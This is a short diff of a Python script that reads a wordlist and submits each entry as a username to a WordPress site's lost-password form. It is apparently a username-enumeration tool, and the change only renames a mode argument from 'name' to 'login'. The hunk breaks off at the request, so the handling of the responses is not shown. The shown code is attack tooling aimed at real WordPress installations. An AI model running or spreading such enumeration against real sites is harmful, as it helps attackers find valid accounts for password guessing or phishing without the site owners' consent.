@@ -1,7 +1,7 @@
 from requests import post,get,Session
 from sys import argv
 words=open(argv[2],"r").read().splitlines()
-if argv[3]=="name":
+if argv[3]=="login":
    for word in words:
       data={'user_login': word,'redirect_to':'','wp-submit':'Get+New+Password'}
       x=post(argv[1]+"/wp-login.php?action=lostpassword", data=data)
